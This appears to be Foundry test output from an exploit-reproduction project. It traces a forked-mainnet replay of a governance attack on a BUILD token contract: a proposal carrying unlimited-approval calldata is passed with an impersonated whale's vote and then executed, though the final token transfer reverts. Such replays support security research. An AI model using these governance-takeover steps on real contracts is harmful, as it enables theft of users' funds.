Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.38s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 281.08ms (296.10µs CPU time)

Ran 1 test for src/test/2022-02/BuildF_exp.sol:ContractTest
[FAIL. Reason: revert: ERC20: transfer amount exceeds allowance] test() (gas: 481549)
Logs:
  Befre proposing, BUILD balance of attacker:: 101529401443281484977
  After proposing, BUILD balance of attacker:: 0
  BUILD balance of BuildGovernance contract:: 7782594307409903710320
  Proposal count:: 8
  Proposal state:: 0
  After 2 days, Proposal state:: 3

Traces:
  [5224] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 14235712 [1.423e7])
    │   └─ ← [Return] 0
    └─ ← [Stop] 

  [481549] ContractTest::test()
    ├─ [0] VM::prank(0x562680a4dC50ed2f14d75BF31f494cfE0b8D10a1)
    │   └─ ← [Return] 
    ├─ [30152] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 101529401443281484977 [1.015e20])
    │   ├─ emit Transfer(from: 0x562680a4dC50ed2f14d75BF31f494cfE0b8D10a1, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 101529401443281484977 [1.015e20])
    │   └─ ← [Return] true
    ├─ [541] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 101529401443281484977 [1.015e20]
    ├─ emit log_named_uint(key: "Befre proposing, BUILD balance of attacker:", val: 101529401443281484977 [1.015e20])
    ├─ [24665] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::approve(0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [162049] 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583::propose(0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739, 0, 0x095ea7b3000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   ├─ [541] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 101529401443281484977 [1.015e20]
    │   ├─ [11005] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, 101529401443281484977 [1.015e20])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, value: 101529401443281484977 [1.015e20])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, value: 115792089237316195423570985008687907853269984665640564039356054606469848154958 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 0
    ├─ [541] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "After proposing, BUILD balance of attacker:", val: 0)
    ├─ [541] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::balanceOf(0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583) [staticcall]
    │   └─ ← [Return] 7782594307409903710320 [7.782e21]
    ├─ emit log_named_uint(key: "BUILD balance of BuildGovernance contract:", val: 7782594307409903710320 [7.782e21])
    ├─ [0] VM::prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002)
    │   └─ ← [Return] 
    ├─ [24665] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::approve(0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: 0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002, spender: 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [0] VM::prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002)
    │   └─ ← [Return] 
    ├─ [123898] 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583::vote(8, true)
    │   ├─ [2541] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::balanceOf(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002) [staticcall]
    │   │   └─ ← [Return] 321442044474550317364484 [3.214e23]
    │   ├─ [9005] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::transferFrom(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002, 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, 321442044474550317364484 [3.214e23])
    │   │   ├─ emit Transfer(from: 0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002, to: 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, value: 321442044474550317364484 [3.214e23])
    │   │   ├─ emit Approval(owner: 0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002, spender: 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, value: 115792089237316195423570985008687907853269984665640563718015539533362812275451 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [393] 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583::proposalCount()
    │   └─ ← [Return] 8
    ├─ emit log_named_int(key: "Proposal count:", val: 8)
    ├─ [866] 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583::state(8)
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Proposal state:", val: 0)
    ├─ [0] VM::warp(1655436437 [1.655e9])
    │   └─ ← [Return] 
    ├─ [1650] 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583::state(8)
    │   └─ ← [Return] 3
    ├─ emit log_named_uint(key: "After 2 days, Proposal state:", val: 3)
    ├─ [48884] 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583::execute(8, 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739, 0, 0x095ea7b3000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   ├─ [24665] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::approve(DefaultTestContract: [0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ emit Approval(owner: 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, spender: DefaultTestContract: [0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [541] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::balanceOf(0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583) [staticcall]
    │   └─ ← [Return] 329224638781960221074804 [3.292e23]
    ├─ [26230] 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739::transferFrom(0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 329224638781960221074804 [3.292e23])
    │   ├─ emit Transfer(from: 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 329224638781960221074804 [3.292e23])
    │   └─ ← [Revert] revert: ERC20: transfer amount exceeds allowance
    └─ ← [Revert] revert: ERC20: transfer amount exceeds allowance

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 333.44ms (1.29ms CPU time)

Ran 2 test suites in 335.37ms (614.52ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)

Failing tests:
Encountered 1 failing test in src/test/2022-02/BuildF_exp.sol:ContractTest
[FAIL. Reason: revert: ERC20: transfer amount exceeds allowance] test() (gas: 481549)

Encountered a total of 1 failing tests, 1 tests succeeded
